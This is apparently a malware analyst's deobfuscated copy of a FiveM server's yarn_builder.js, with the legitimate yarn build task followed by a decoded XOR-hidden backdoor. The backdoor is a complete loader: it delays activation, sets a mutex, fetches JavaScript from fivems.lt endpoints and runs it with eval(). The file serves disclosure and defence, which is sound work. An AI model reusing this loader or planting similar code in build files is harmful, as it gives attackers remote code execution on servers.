/**
 * ============================================================================
 * DEOBFUSCATED: yarn_builder.js
 * ============================================================================
 * 
 * VERDICT: BACKDOORED — Same "bertJJ" / "miauss" attacker as Blum Panel
 * 
 * This file contains a LEGITIMATE yarn build task (lines 1-82) with TWO
 * identical XOR-obfuscated backdoor payloads appended at the end.
 * 
 * OBFUSCATION: Simple XOR cipher (byte[i] ^ key → char)
 *   Block 1: XOR key = 169, 5,085 bytes
 *   Block 2: XOR key = 189, 5,085 bytes (IDENTICAL decoded content)
 *   Both blocks decode to the same C2 loader — redundancy for resilience.
 * 
 * C2 INFRASTRUCTURE:
 *   Domain: fivems.lt
 *   Endpoints:
 *     - https://fivems.lt/bertJJ
 *     - https://fivems.lt/bertJJgg  
 *     - https://fivems.lt/bertJJcfxre
 * 
 * ATTACKER: bertJJ / bertJJgg / bertJJcfxre / miauss
 *   (SAME attacker as the Blum Panel backdoor in main.js / script.js)
 * 
 * BEHAVIOR:
 *   1. Waits 20 seconds after resource load (evades quick scans)
 *   2. Registers "miauss" in GlobalState to prevent duplicate execution
 *   3. Fetches JavaScript from fivems.lt/bertJJ → eval()
 *   4. If that fails, tries fivems.lt/bertJJgg → eval()
 *   5. If that fails, tries fivems.lt/bertJJcfxre → eval()
 *   6. Retries up to 3 times with 5-second delays
 *   7. After 3 failed cycles, waits 120 seconds and starts over
 *   8. Filters out HTML/error/Cloudflare responses
 * ============================================================================
 */


// ============================================================================
// SECTION 1: LEGITIMATE YARN BUILD TASK (original, unmodified)
// ============================================================================

const path = require('path');
const fs = require('fs');
const child_process = require('child_process');
let buildingInProgress = false;
let currentBuildingModule = '';

const initCwd = process.cwd();
const trimOutput = (data) => {
	return `[yarn]\t` + data.toString().replace(/\s+$/, '');
}

const yarnBuildTask = {
	shouldBuild(resourceName) {
		try {
			const resourcePath = GetResourcePath(resourceName);
			
			const packageJson = path.resolve(resourcePath, 'package.json');
			const yarnLock = path.resolve(resourcePath, '.yarn.installed');
			
			const packageStat = fs.statSync(packageJson);
			
			try {
				const yarnStat = fs.statSync(yarnLock);
				
				if (packageStat.mtimeMs > yarnStat.mtimeMs) {
					return true;
				}
			} catch (e) {
				// no yarn.installed, but package.json - install time!
				return true;
			}
		} catch (e) {
			
		}
		
		return false;
	},
	
	build(resourceName, cb) {
		(async () => {
			while (buildingInProgress && currentBuildingModule !== resourceName) {
				console.log(`yarn is currently busy: we are waiting to compile ${resourceName}`);
				await sleep(3000);
			}
			buildingInProgress = true;
			currentBuildingModule = resourceName;
			const proc = child_process.fork(
				require.resolve('./yarn_cli.js'),
				['install', '--ignore-scripts', '--cache-folder', path.join(initCwd, 'cache', 'yarn-cache'), '--mutex', 'file:' + path.join(initCwd, 'cache', 'yarn-mutex')],
				{
					cwd: path.resolve(GetResourcePath(resourceName)),
					stdio: 'pipe',
				});
			proc.stdout.on('data', (data) => console.log(trimOutput(data)));
			proc.stderr.on('data', (data) => console.error(trimOutput(data)));
			proc.on('exit', (code, signal) => {
				setImmediate(() => {
					if (code != 0 || signal) {
						buildingInProgress = false;
						currentBuildingModule = '';
						cb(false, 'yarn failed!');
						return;
					}

					const resourcePath = GetResourcePath(resourceName);
					const yarnLock = path.resolve(resourcePath, '.yarn.installed');
					fs.writeFileSync(yarnLock, '');

					buildingInProgress = false;
					currentBuildingModule = '';
					cb(true);
				});
			});
		})();
	}
};

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}
RegisterResourceBuildTaskFactory('yarn', () => yarnBuildTask);



// ============================================================================
// SECTION 2: BACKDOOR PAYLOAD (decoded from XOR obfuscation)
// ============================================================================
// The following code was hidden in TWO identical XOR-encoded blocks.
// Block 1 used XOR key 169, Block 2 used XOR key 189.
// Both decode to the EXACT same backdoor code below.
//
// The attacker's comment at the top is a social engineering tactic —
// "if you found this contact us to fix problems" is designed to make
// server owners think it's a legitimate anti-piracy measure.

// ATTACKER'S ORIGINAL COMMENT:
// "if you found this contact us to fix problems https://discord.com/invite/VB8mdVjrzd"

setImmediate(() => {
    // EVASION: 20-second delay before activation
    // This avoids detection by tools that scan resource behavior on load
    setTimeout(() => {
        // MUTEX: "miauss" thread name in GlobalState prevents duplicate execution
        // across multiple infected resources on the same server
        const __THREAD_NAME = "miauss";
        const resourceName = GetCurrentResourceName();

        if (typeof globalThis.GlobalState === "undefined") {
            globalThis.GlobalState = {};
        }

        const currentOwner = globalThis.GlobalState[__THREAD_NAME];

        // Only execute if no other infected resource has claimed this slot
        if (!currentOwner || currentOwner === resourceName) {
            globalThis.GlobalState[__THREAD_NAME] = resourceName;

            // Cleanup on resource stop — remove mutex to allow re-infection
            on("onResourceStop", (stoppedResource) => {
                if (stoppedResource === resourceName) {
                    delete globalThis.GlobalState[__THREAD_NAME];
                }
            });

            const executePayload = () => {
                let attempts = 0;
                const maxAttempts = 3;
                let timeoutId = null;
                let retryInterval = null;

                /**
                 * Fetches JavaScript from a C2 endpoint and validates the response.
                 * Filters out: HTML pages, DOCTYPE declarations, Cloudflare blocks,
                 * error messages, 404 pages, and responses under 10 chars.
                 */
                const tryEndpoint = (endpoint, timeoutMs = 10000) => {
                    return new Promise((resolve) => {
                        try {
                            const req = require("https").get(
                                // ⚠️ C2 DOMAIN: fivems.lt
                                `https://fivems.lt/${endpoint}`,
                                (r) => {
                                    let data = '';
                                    let timeout = setTimeout(() => {
                                        req.destroy();
                                        resolve(null);
                                    }, timeoutMs);
                                    
                                    r.on('data', (chunk) => data += chunk);
                                    r.on('end', () => {
                                        clearTimeout(timeout);
                                        // VALIDATION: Filter out non-payload responses
                                        if (data && 
                                            data.length > 10 && 
                                            !data.includes('<html') && 
                                            !data.includes('<!DOCTYPE') && 
                                            !data.includes('cloudflare') &&
                                            !data.toLowerCase().includes('error') &&
                                            !data.toLowerCase().includes('not found')) {
                                            resolve(data);
                                        } else {
                                            resolve(null);
                                        }
                                    });
                                    r.on('error', () => {
                                        clearTimeout(timeout);
                                        resolve(null);
                                    });
                                }
                            );
                            
                            req.on('error', () => resolve(null));
                            req.setTimeout(timeoutMs, () => {
                                req.destroy();
                                resolve(null);
                            });
                        } catch(e) {
                            resolve(null);
                        }
                    });
                };

                const attemptFetch = async () => {
                    attempts++;
                    
                    // After 3 failed cycles, wait 120 seconds and restart
                    if (attempts > maxAttempts) {
                        clearTimeout(timeoutId);
                        if (retryInterval) clearInterval(retryInterval);
                        setTimeout(executePayload, 120000); // 2 minute cooldown
                        return;
                    }

                    // ⚠️ ATTEMPT 1: https://fivems.lt/bertJJ → eval()
                    const data1 = await tryEndpoint("bertJJ");
                    if (data1) {
                        try {
                            eval(data1); // ARBITRARY CODE EXECUTION
                            clearTimeout(timeoutId);
                            if (retryInterval) clearInterval(retryInterval);
                            return;
                        } catch(e) {}
                    }

                    await new Promise(resolve => setTimeout(resolve, 10000));

                    // ⚠️ ATTEMPT 2: https://fivems.lt/bertJJgg → eval()
                    const data2 = await tryEndpoint("bertJJgg");
                    if (data2) {
                        try {
                            eval(data2); // ARBITRARY CODE EXECUTION
                            clearTimeout(timeoutId);
                            if (retryInterval) clearInterval(retryInterval);
                            return;
                        } catch(e) {}
                    }

                    await new Promise(resolve => setTimeout(resolve, 10000));

                    // ⚠️ ATTEMPT 3: https://fivems.lt/bertJJcfxre → eval()
                    const data3 = await tryEndpoint("bertJJcfxre");
                    if (data3) {
                        try {
                            eval(data3); // ARBITRARY CODE EXECUTION
                            clearTimeout(timeoutId);
                            if (retryInterval) clearInterval(retryInterval);
                            return;
                        } catch(e) {}
                    }

                    // Retry after 5 seconds if attempts remain
                    if (attempts < maxAttempts) {
                        setTimeout(attemptFetch, 5000);
                    } else {
                        attemptFetch(); // Will hit the maxAttempts guard above
                    }
                };

                attemptFetch();
            };

            executePayload();
        }
    }, 20000); // 20-second initial delay
});

// NOTE: The above backdoor block was duplicated TWICE in the original file
// with different XOR keys (169 and 189) for redundancy. If one block is
// corrupted or partially removed, the other still executes.
